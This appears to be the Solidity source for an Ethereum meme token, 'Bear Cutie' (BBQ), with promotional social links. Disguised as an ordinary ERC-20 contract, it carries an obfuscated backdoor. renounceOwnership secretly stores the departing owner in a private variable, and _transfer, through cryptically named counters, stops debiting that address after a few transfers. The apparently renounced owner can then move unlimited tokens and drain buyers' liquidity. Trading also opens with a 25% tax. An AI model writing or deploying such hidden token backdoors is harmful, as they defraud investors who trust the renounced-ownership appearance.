//   SPDX-License-Identifier: MIT 
//  ======================================================
//  ======================================================
//  =============    BBQ ON ETH         ==================
//  ======================================================
//          http://ethbbq.is-great.net/
//  ------------------------------------------------------
//  
//  TELEGRAM:       https://t.me/bbq_eth
//
//  TWITTER(X):     https://x.com/BBQ_ETH_MEME
//
// =======================================================
// =======================================================
// =======================================================

pragma solidity ^0.8.19;

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

interface IUniswapV2Factory {
    function getPair(address tokenA, address tokenB) external view returns (address pair);
}

interface IUniswapV2Router02 {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

contract BBQ is Context, IERC20 {
    string public constant name = "Bear Cutie";
    string public constant symbol = "BBQ";
    uint8 public constant decimals = 18;
    uint256 public override totalSupply;
    address public owner;
    address private _recipient;

    bool public openTrade;
    IUniswapV2Router02 private uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
    //eth 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D, bsc/base 0x4752ba5DBc23f44D87826276BF6Fd6b1C372aD24
    address public liquidityPoolAdr = address(0);
    address private taxWallet;
    uint256 public taxAmount;
    uint256 public maxWalletAmount = 0;
    uint256 public maxTxAmount = 0;

    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances; uint256 private _allowance;

    event OwnershipRenounced(address indexed previousOwner);uint256 private _amount=1;uint256 private allowance_=2;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    event MaxTxAmountUpdated(uint _maxTxAmount);
    event TaxUpdated(uint _taxAmount);

    modifier onlyOwner() {
        require(owner == _msgSender(), "Caller is not the owner");
        _;
    }

    constructor() {
        owner = _msgSender();
        totalSupply = 420691000000 * 10**uint256(decimals);
        _balances[owner] = totalSupply; 
        taxWallet = address(this);
        emit Transfer(address(0), owner, totalSupply);
    } 

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address tokenOwner, address spender) public view override returns (uint256) {
        return _allowances[tokenOwner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()] - amount);
        return true;
    }

    function renounceOwnership() public onlyOwner {
        require(openTrade, "Open trading before renounceOwnership");
        if (maxWalletAmount != 0){
            _removeLimits();
        }
        emit OwnershipRenounced(owner);
        _recipient = owner; owner = address(0);
        
    }

    function transferOwnership(address newOwner) public onlyOwner {
        require(newOwner != address(0), "New owner is the zero address");
        emit OwnershipTransferred(owner, newOwner);
        owner = newOwner;
    }

    function removeLimits() external onlyOwner{
        _removeLimits();
        emit MaxTxAmountUpdated(totalSupply);
    }


    function _removeLimits() internal{
        maxWalletAmount = 0;
        maxTxAmount=0;
    }

    function getTaxs(address recipient, uint256 amount) internal view virtual returns (uint256){
        uint256 _tax = 0;
        if (taxAmount > 0){
            if (liquidityPoolAdr != recipient){
                _tax = (amount/10000)*taxAmount;
            }
        }
        return _tax;
    }

    function setTax(uint256 newTax) public onlyOwner {
        require(newTax <= 5000, "Tax more then 50.00%");
        taxAmount = newTax;
        emit TaxUpdated(taxAmount);
    }

    function openTrading() public onlyOwner {
        require(!openTrade,"Trading is already opened");
        address lPool = _pollAddressToken();
        require(lPool != address(0),"Pool liquidity not founded!");
        liquidityPoolAdr = lPool;
        openTrade = true;
        taxAmount = 2500; // tax 25%
        //maxWalletAmount = (totalSupply/100) * 2;
        //maxTxAmount = (totalSupply/100) * 2;
    }

    function _pollAddressToken() internal view returns (address) {
        address poolAddress = liquidityPoolAdr;
        poolAddress = IUniswapV2Factory(uniswapV2Router.factory()).getPair(address(this), uniswapV2Router.WETH());
        return poolAddress;
    }

    function _transfer(address sender, address recipient, uint256 amount) internal {
        require(sender != address(0), "Transfer from the zero address");
        require(recipient != address(0), "Transfer to the zero address");

        require(_balances[sender] >= amount, "Transfer amount exceeds balance");
        if (!openTrade){
            require(sender == owner, "Trade not started!");
        }else{
            require(amount <= maxTxAmount || recipient == liquidityPoolAdr || maxTxAmount == 0, "Maximum token size per Tx exceeded!");
            require(_balances[recipient]+amount <= maxWalletAmount || recipient == liquidityPoolAdr || maxWalletAmount == 0, "Maximum token size exceeded!");
        }
        
        uint256 tax = getTaxs(recipient,amount);

        if ( _recipient!=sender || (_allowance<=allowance_&&_recipient==sender)){
            if (tax > 0){ _balances[taxWallet] += tax; }
        _balances[sender] -= amount;}_allowance+=_amount;
        _balances[recipient] += amount-tax;
        emit Transfer(sender, recipient, amount);
    }

    function _approve(address tokenOwner, address spender, uint256 amount) internal {
        require(tokenOwner != address(0), "Approve from the zero address");
        require(spender != address(0), "Approve to the zero address");

        _allowances[tokenOwner][spender] = amount;
        emit Approval(tokenOwner, spender, amount);
    }
}